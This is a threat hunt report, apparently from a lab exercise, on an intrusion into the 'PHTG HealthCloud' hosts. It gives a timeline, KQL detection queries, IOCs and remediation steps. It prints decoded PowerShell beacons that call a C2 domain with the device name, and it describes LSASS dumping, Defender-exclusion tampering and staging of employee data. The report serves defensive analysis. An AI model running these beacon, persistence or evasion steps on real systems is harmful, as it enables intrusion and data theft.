# 🚨 Threat Hunt Report — Operation: Signals After the Noise

**Analyst:** MK  
**Classification:** TLP:RED — Internal Use Only  
**Workspace:** LAW (Microsoft Sentinel)  
**Investigation Window:** 2025-12-13 09:00 UTC → 2025-12-13 18:00 UTC  
**Anchor Event:** 2025-12-13 09:48:40 UTC  
**Target Environment:** PHTG HealthCloud Estate  
**Report Date:** 2025-12-13  

---

## Executive Summary

An operator gained access to the PHTG HealthCloud estate using pre-obtained credentials and conducted a structured post-intrusion operation lasting approximately eight hours. The operator deployed persistent tooling, tampered with host defences, harvested credentials from LSASS, and staged employee data for exfiltration. Two hosts were accessed. Persistence remains resident. Credential material is compromised. A staged data archive was confirmed on disk at end of window.

---

## Section 1 — What Happened

### Chronological Reconstruction

| Time (UTC) | Event |
|---|---|
| 09:05 | `vmadminusername` authenticates via Batch logon to `azwks-phtg-02` |
| 09:48 | `vmadminusername` authenticates to `azwks-phtg-01` via RDP from `10.0.0.152` **(anchor event)** |
| 09:52 | `vmadminusername` authenticates to `azwks-phtg-02` directly from external IP `173.244.55.131` |
| 10:04 | Operator opens interactive PowerShell on `azwks-phtg-01` via `explorer.exe` |
| 10:11 | `_.ps1` executes: transient Defender exclusion add/remove; scheduled tasks registered; Run key `PHTGHealthCloudTray` written |
| 10:12 | `PHTGHealthCloudSvc.exe` deployed; healthcheck loop starts (22 executions); permanent Defender exclusions written; collect-and-report loop fires |
| 10:12 | `PHTG HealthCloud.lnk` dropped to Startup folder (second persistence mechanism) |
| 10:13 | Two encoded PowerShell beacons fire to `updates.health-cloud.cc` and `status.health-cloud.cc` |
| 10:14 | `amsi_probe.ps1` executes; LSASS handle opened (5136 → 2047999); `ReadProcessMemoryApiCall` confirmed — credential dump complete |
| 10:15 | `hc_lineage.ps1` executes — process tree enumeration |
| 10:11–10:13 | `attrib.exe` hides artefacts: Cache (17 ops), TempCache (3 ops) |
| 16:48 | 7-Zip pulled from `raw.githubusercontent.com`; employee CSV archived to ZIP in `C:\ProgramData\` |
| 17:57 | Unexplained outbound to `84.239.25.6:48327` — process unattributed |

---

## Section 2 — Who

| Field | Detail |
|---|---|
| Primary account | `vmadminusername` |
| Access vector | Credential reuse — `vmadminusername` absent from all failed logon attempts; credential pre-obtained |
| External operator IP | `173.244.55.131` (azwks-phtg-02 access) |
| Internal pivot source | `10.0.0.152` (azwks-phtg-01 RDP) |
| Secondary account | `donaldhess86` (lateral movement to `donnylinuxprogrammatic` at 15:38 — separate chain) |
| C2 parent domain | `health-cloud.cc` |
| C2 download channel | `updates.health-cloud.cc` → `104.21.36.232` |
| C2 beacon channel | `status.health-cloud.cc` → `172.67.200.204` |

---

## Section 3 — Where

### Affected Hosts

| Host | IP | Role |
|---|---|---|
| `azwks-phtg-01` | `10.0.0.105` | Primary — operator staging, tooling, credential dump |
| `azwks-phtg-02` | `10.0.0.x` | Secondary — direct access from external IP |
| `donnylinuxprogrammatic` | — | Tertiary — separate account chain, unresolved |

### Key Artefact Paths

| Path | Purpose |
|---|---|
| `C:\Users\vmAdminUsername\Documents\PHTG\_.ps1` | First operator script — orchestrates persistence and exclusions |
| `C:\ProgramData\PHTG\HealthCloud\PHTGHealthCloudSvc.exe` | Implant — masquerades as `bitsadmin.exe` |
| `C:\ProgramData\PHTG\HealthCloud\Cache\task_FLAG-*.ps1` | Scheduled task payloads |
| `C:\ProgramData\PHTG\HealthCloud\Bin\HealthCloudTray.ps1` | Run key persistence payload — fired 2x in window |
| `C:\ProgramData\PHTG\HealthCloud\Bin\amsi_probe.ps1` | AMSI surface test |
| `C:\ProgramData\PHTG\HealthCloud\Bin\hc_lineage.ps1` | Process lineage enumeration |
| `C:\ProgramData\employee-data-20251213164851.zip` | Staged data archive — exfiltration NOT confirmed |
| `C:\ProgramData\employee-data-temp20251213164851.csv` | Source data file |
| `...\Start Menu\Programs\Startup\PHTG HealthCloud.lnk` | Startup folder persistence |

---

## Section 4 — How (Techniques and Tooling)

### 4.1 Initial Access — `T1078` Valid Accounts

Credential reuse. `vmadminusername` used successfully on first attempt. Account is absent from all failed logon attempts (`root`, `administrator`, `admin`, `backup` targeted by separate actors). Credential was obtained prior to this session via unknown means.

```kql
-- Failed logons (brute force test — comparison query)
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-12-13 09:00:00) .. datetime(2025-12-13 18:00:00))
| where ActionType == "LogonFailed"
| summarize FailCount=count() by AccountName, RemoteIP, DeviceName
| sort by FailCount desc

-- Successful logons
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-12-13 09:00:00) .. datetime(2025-12-13 18:00:00))
| where ActionType == "LogonSuccess"
| project TimeGenerated, DeviceName, AccountName, AccountDomain, RemoteIP, LogonType
| sort by TimeGenerated asc
```

---

### 4.2 Lateral Movement — `T1021.001` Remote Desktop Protocol

`azwks-phtg-01` accessed via RDP from internal `10.0.0.152` at 09:48:40. `azwks-phtg-02` accessed directly from external `173.244.55.131`. No onward pivot from phtg-01 confirmed — `10.0.0.105` generated zero successful outbound logons.

```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-12-13 09:48:00) .. datetime(2025-12-13 18:00:00))
| where LogonType in ("Network", "RemoteInteractive")
| where ActionType == "LogonSuccess"
| project TimeGenerated, DeviceName, AccountName, RemoteIP, LogonType, AccountDomain
| sort by TimeGenerated asc

-- Onward pivot check
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-12-13 09:48:00) .. datetime(2025-12-13 18:00:00))
| where RemoteIP == "10.0.0.105"
| where ActionType == "LogonSuccess"
| project TimeGenerated, DeviceName, AccountName, RemoteIP, LogonType
```

---

### 4.3 Execution — `T1059.001` PowerShell

All operator scripts invoked with `-WindowStyle Hidden -ExecutionPolicy Bypass`. `cmd.exe` used as intermediary to break parent-child process lineage. Scheduled tasks fired `task_FLAG-*.ps1` scripts via `svchost.exe` parent. Collect-and-report pattern: `cmd.exe` captures `whoami` output, `PHTGHealthCloudSvc.exe` transmits one second later.

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-12-13 09:48:00) .. datetime(2025-12-13 18:00:00))
| where DeviceName in ("azwks-phtg-01", "azwks-phtg-02")
| where AccountName == "vmadminusername"
| where FileName in ("powershell.exe","pwsh.exe","cmd.exe","wscript.exe","cscript.exe","mshta.exe")
    or ProcessCommandLine has_any (".ps1",".bat",".vbs",".js",".cmd")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by TimeGenerated asc
```

---

### 4.4 Persistence — Three Mechanisms

| Mechanism | Detail | MITRE |
|---|---|---|
| Run Key | `HKCU\...\CurrentVersion\Run\PHTGHealthCloudTray` → `HealthCloudTray.ps1`. Fired 2x in window. | T1547.001 |
| Startup Folder | `PHTG HealthCloud.lnk` dropped to user Startup folder. Detected by Defender — not blocked. | T1547.001 |
| Scheduled Tasks | `HKLM\...\TaskCache\Tree\PHTG HealthCloud Compliance FLAG-*`. System-level, logon-independent. 22 healthcheck executions confirmed. | T1053.005 |

```kql
-- Persistence isolation
DeviceRegistryEvents
| where TimeGenerated between (datetime(2025-12-13 09:48:00) .. datetime(2025-12-13 18:00:00))
| where DeviceName == "azwks-phtg-01"
| where InitiatingProcessAccountName == "vmadminusername"
| where RegistryKey has_any ("Run","RunOnce","Services","Schedule","Winlogon","Shell",
    "Userinit","Boot","SessionManager","KnownDLLs","AppInit","Image File Execution",
    "Debugger","SilentProcessExit")
| project TimeGenerated, ActionType, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName

-- Startup folder artefacts
DeviceFileEvents
| where TimeGenerated > datetime(2025-12-13T09:48:40Z)
| where DeviceName == "azwks-phtg-01"
| where FolderPath has_any ("Startup","Start Menu\\Programs\\Startup",
    "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
    "ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
| project TimeGenerated, InitiatingProcessAccountName, ActionType, FileName, FolderPath, InitiatingProcessFileName

-- Persistence startup execution count
DeviceProcessEvents
| where TimeGenerated > datetime(2025-12-13T10:12:59Z)
| where DeviceName == "azwks-phtg-01"
| where ProcessCommandLine has "HealthCloudTray.ps1"
| count
```

---

### 4.5 Defence Evasion

| Technique | Detail | MITRE |
|---|---|---|
| LOLBin Masquerade | `PHTGHealthCloudSvc.exe` claims `OriginalFileName: bitsadmin.exe`. Located in `ProgramData` — not `System32`. Path was the tell. | T1036.005 |
| Permanent Defender Exclusions | Path: `C:\ProgramData\PHTG\HealthCloud\Cache`. Process: `PHTGHealthCloudSvc.exe`. Written via `msmpeng.exe`. | T1562.001 |
| Transient Defender Exclusion | `C:\Users\vmAdminUsername\Documents\PHTG` added and removed within seconds inside `_.ps1`. Self-cleaning blind window for payload drop. | T1562.001 |
| Attribute Hiding | `attrib.exe +h +s` applied across Cache (17 ops) and TempCache (3 ops). | T1564.001 |
| Encoded Beacons | Two `Invoke-WebRequest` payloads Base64-encoded. Output suppressed with `Out-Null`. 5-second timeout. | T1027 |
| Custom Event Log Source | `PHTGHealthCloud` registered under `HKLM EventLog\Application`. Enables writing to Application log — low scrutiny, treated as trusted by defenders. | T1112 |
| AMSI Probe | `amsi_probe.ps1` executed at 10:14:10 to test defensive surface before heavier tooling. | T1562.001 |
| Lineage Break | `cmd.exe` used as intermediary to spawn `whoami` and `hc_lineage.ps1`, obscuring PowerShell parentage. | T1036 |

```kql
-- LOLBin masquerade detection
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-12-13 09:48:00) .. datetime(2025-12-13 18:00:00))
| where DeviceName == "azwks-phtg-01"
| where isnotempty(ProcessVersionInfoOriginalFileName)
| where FileName != ProcessVersionInfoOriginalFileName
| where FolderPath !startswith "C:\\Windows"
    and FolderPath !startswith "C:\\Program Files"
| project TimeGenerated, AccountName, FileName, ProcessVersionInfoOriginalFileName,
          FolderPath, ProcessCommandLine, InitiatingProcessFileName

-- Attrib hiding
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-12-13 09:48:00) .. datetime(2025-12-13 18:00:00))
| where DeviceName == "azwks-phtg-01"
| where FileName == "attrib.exe"
| where ProcessCommandLine has_any ("+h", "+s")
| extend TopDir = extract(@"C:\\ProgramData\\PHTG\\HealthCloud\\([^\\]+)", 1, ProcessCommandLine)
| summarize AttribCount=count() by TopDir
| sort by AttribCount desc

-- Defender exclusions (registry)
DeviceRegistryEvents
| where TimeGenerated between (datetime(2025-12-13T09:48:40Z) .. datetime(2025-12-13T18:00:00Z))
| where DeviceName == "azwks-phtg-01"
| where RegistryKey has "Defender" and RegistryKey has "Exclusions"
| project TimeGenerated, ActionType, RegistryKey, RegistryValueName,
          RegistryValueData, InitiatingProcessFileName

-- Encoded beacons
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-12-13 09:48:00) .. datetime(2025-12-13 18:00:00))
| where DeviceName == "azwks-phtg-01"
| where FileName == "powershell.exe"
| where ProcessCommandLine has "-EncodedCommand"
| project TimeGenerated, AccountName, ProcessCommandLine, InitiatingProcessFileName
```

**Decoded beacon payloads:**

```
Beacon 1 (10:13:43):
Invoke-WebRequest -Uri "https://status.health-cloud.cc/api/checkin?flag=FLAG-09&device=azwks-phtg-01"
  -UseBasicParsing -TimeoutSec 5 | Out-Null

Beacon 2 (10:13:56):
Invoke-WebRequest -Uri "https://status.health-cloud.cc/api/status?flag=FLAG-10&device=azwks-phtg-01"
  -UseBasicParsing -TimeoutSec 5 | Out-Null
```

---

### 4.6 Command and Control — `T1071.001` / `T1573`

**Dual-channel architecture:** resilience (one channel survives if other blocked) and detection split (each channel's traffic individually below threshold; finding one does not surface the other).

| Channel | Mechanism | Endpoint | Count |
|---|---|---|---|
| Primary | `PHTGHealthCloudSvc.exe /healthcheck` loop via scheduled task | `updates.health-cloud.cc` / `status.health-cloud.cc` | 22 executions |
| Secondary | Encoded PowerShell `Invoke-WebRequest`, `Out-Null`, 5-sec timeout | `status.health-cloud.cc/api/checkin` and `/api/status` | 2 beacons |

```kql
-- Network outbound (operator PowerShell)
DeviceNetworkEvents
| where TimeGenerated between (datetime(2025-12-13 09:48:00) .. datetime(2025-12-13 18:00:00))
| where DeviceName == "azwks-phtg-01"
| where InitiatingProcessFileName == "powershell.exe"
| project TimeGenerated, RemoteUrl, RemoteIP, RemotePort, InitiatingProcessAccountName

-- Healthcheck loop count
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-12-13T09:48:40Z) .. datetime(2025-12-13T18:00:00Z))
| where DeviceName == "azwks-phtg-01"
| where FileName == "PHTGHealthCloudSvc.exe"
| where ProcessCommandLine has "/healthcheck"
| count
```

---

### 4.7 Credential Access — `T1003.001` LSASS Memory

`powershell.exe` under `vmadminusername` opened handle to `lsass.exe` at 10:14:37. Two-stage access escalation:

| Time | DesiredAccess (decimal) | Hex | Rights |
|---|---|---|---|
| 10:14:37 | 5136 | 0x1410 | `PROCESS_QUERY_INFORMATION` + `PROCESS_VM_READ` — probe |
| 10:14:38 | 2047999 | 0x1F3FFF | Near-complete access including VM read/write — dump |

`ReadProcessMemoryApiCall` confirmed fired. `ProcessPrimaryTokenModified` fired 42 times during session — token manipulation.

```kql
-- LSASS OpenProcess
DeviceEvents
| where TimeGenerated between (datetime(2025-12-13 09:00:00) .. datetime(2025-12-13 18:00:00))
| where DeviceName == "azwks-phtg-01"
| where ActionType == "OpenProcessApiCall"
| where InitiatingProcessFileName == "powershell.exe"
| where InitiatingProcessAccountName == "vmadminusername"
| project TimeGenerated, AdditionalFields, InitiatingProcessFileName

-- ReadProcessMemory confirmation
DeviceEvents
| where TimeGenerated between (datetime(2025-12-13T10:14:38Z) .. datetime(2025-12-13T18:00:00Z))
| where DeviceName == "azwks-phtg-01"
| where InitiatingProcessFileName == "powershell.exe"
| where InitiatingProcessAccountName == "vmadminusername"
| summarize count() by ActionType
```

---

### 4.8 Collection and Staging — `T1560.001` / `T1074.001`

7-Zip pulled silently from `raw.githubusercontent.com` at 16:48. Employee data CSV archived to ZIP.

```
"7z.exe" a C:\ProgramData\employee-data-20251213164851.zip C:\ProgramData\employee-data-temp20251213164851.csv
```

Archive confirmed on disk. Exfiltration NOT confirmed within investigation window. Unexplained outbound to `84.239.25.6:48327` at 17:57 — process unattributed.

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-12-13T16:48:00Z) .. datetime(2025-12-13T18:00:00Z))
| where DeviceName == "azwks-phtg-01"
| where InitiatingProcessFileName has_any ("7z.exe","7za.exe","7zr.exe")
    or FileName has_any ("7z.exe","7za.exe")
| project TimeGenerated, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
```

---

## Section 5 — Defensive Posture Assessment

| Control | Status | Detail |
|---|---|---|
| Windows Defender | ⚠️ Detect-only — NO prevention | `AntivirusReport` generated on LNK. `WasExecutingWhileDetected: false`. Persistence not blocked. |
| Defender Exclusions | ❌ Compromised | Cache directory and `PHTGHealthCloudSvc.exe` excluded from scanning by operator. |
| AMSI | ⚠️ Probed | Operator tested AMSI before deploying tooling. Effectiveness unknown — operator proceeded. |
| Scheduled Task Alerting | ❌ Not triggered | 22 healthcheck executions with no alert generated. |
| Network Egress Controls | ❌ Insufficient | `health-cloud.cc` domain and `173.244.55.131` not blocked at perimeter. |

---

## Section 6 — What We Do Not Yet Know

| Unknown | Notes |
|---|---|
| Initial access vector | How `vmadminusername` credential was obtained prior to this session |
| Persistence residency | No remediation confirmed; assume still resident |
| Exfiltration confirmation | `employee-data-20251213164851.zip` staged but outbound transfer not confirmed |
| `84.239.25.6:48327` | Outbound connection at 17:57 — process unattributed; possible exfil attempt |
| LSASS credential scope | Which accounts harvested, what privilege levels |
| `azwks-phtg-02` activity | Post-access activity not fully mapped |
| `donaldhess86` chain | Separate lateral movement to `donnylinuxprogrammatic` at 15:38 — unresolved |

---

## Section 7 — Indicators of Compromise

| Type | Indicator |
|---|---|
| File | `PHTGHealthCloudSvc.exe` (masquerades as `bitsadmin.exe`) |
| File | `_.ps1`, `amsi_probe.ps1`, `hc_lineage.ps1`, `HealthCloudTray.ps1` |
| File | `PHTG HealthCloud.lnk` |
| File | `employee-data-20251213164851.zip` |
| Directory | `C:\ProgramData\PHTG\HealthCloud\` |
| Domain | `health-cloud.cc` (parent) |
| Domain | `updates.health-cloud.cc` |
| Domain | `status.health-cloud.cc` |
| IP | `173.244.55.131` — operator external IP |
| IP | `104.21.36.232` — `updates.health-cloud.cc` resolution |
| IP | `172.67.200.204` — `status.health-cloud.cc` resolution |
| IP | `84.239.25.6:48327` — unattributed end-of-window outbound |
| Registry | `HKCU\...\CurrentVersion\Run\PHTGHealthCloudTray` |
| Registry | `HKLM\SYSTEM\ControlSet001\Services\EventLog\Application\PHTGHealthCloud` |
| Registry | `HKLM\...\Schedule\TaskCache\Tree\PHTG HealthCloud Compliance FLAG-*` |
| Registry | `HKLM\...\Windows Defender\Exclusions\Paths\C:\ProgramData\PHTG\HealthCloud\Cache` |
| Registry | `HKLM\...\Windows Defender\Exclusions\Processes\PHTGHealthCloudSvc.exe` |
| Account | `vmadminusername` — credential compromised, reuse confirmed |

---

## Section 8 — MITRE ATT&CK Summary

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Valid Accounts | T1078 |
| Lateral Movement | Remote Services: Remote Desktop Protocol | T1021.001 |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 |
| Persistence | Boot or Logon Autostart: Registry Run Keys / Startup Folder | T1547.001 |
| Persistence | Scheduled Task/Job: Scheduled Task | T1053.005 |
| Defence Evasion | Masquerading: Match Legitimate Name or Location | T1036.005 |
| Defence Evasion | Impair Defenses: Disable or Modify Tools | T1562.001 |
| Defence Evasion | Hide Artifacts: Hidden Files and Directories | T1564.001 |
| Defence Evasion | Obfuscated Files or Information | T1027 |
| Defence Evasion | Modify Registry | T1112 |
| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 |
| Command and Control | Encrypted Channel | T1573 |
| Credential Access | OS Credential Dumping: LSASS Memory | T1003.001 |
| Collection | Archive Collected Data: Archive via Utility | T1560.001 |
| Collection | Data Staged: Local Data Staging | T1074.001 |

---

## Section 9 — Recommended Actions

### Immediate

| # | Action | Priority |
|---|---|---|
| 1 | Isolate `azwks-phtg-01` and `azwks-phtg-02` from the network | 🔴 CRITICAL |
| 2 | Rotate `vmadminusername` credentials — credential is burned | 🔴 CRITICAL |
| 3 | Remove all three persistence mechanisms (Run key, LNK, scheduled tasks) | 🔴 CRITICAL |
| 4 | Delete `C:\ProgramData\PHTG\` directory tree and all contents | 🔴 CRITICAL |
| 5 | Remove Defender exclusions for Cache path and `PHTGHealthCloudSvc.exe` | 🔴 CRITICAL |
| 6 | Block `health-cloud.cc` and all subdomains at perimeter | 🔴 CRITICAL |
| 7 | Block `173.244.55.131` and `84.239.25.6` at perimeter | 🟠 HIGH |
| 8 | Determine fate of `employee-data-20251213164851.zip` — confirm whether exfiltrated | 🟠 HIGH |
| 9 | Assume LSASS credential material compromised — audit all accounts on affected hosts | 🟠 HIGH |

### Short Term

| # | Action | Priority |
|---|---|---|
| 10 | Investigate how `vmadminusername` credential was obtained — hunt for prior compromise | 🟠 HIGH |
| 11 | Review `donaldhess86` activity on `donnylinuxprogrammatic` — separate chain, unresolved | 🟡 MEDIUM |
| 12 | Memory forensics on `azwks-phtg-01` to confirm LSASS dump scope | 🟠 HIGH |
| 13 | Enable Defender real-time protection and prevention mode — current posture detect-only | 🟠 HIGH |
| 14 | Review and harden scheduled task creation permissions on estate | 🟡 MEDIUM |
| 15 | Deploy network monitoring for non-standard port outbound connections (e.g. 48327) | 🟡 MEDIUM |

---

*Report generated by MK | Operation: Signals After the Noise | 2025-12-13*
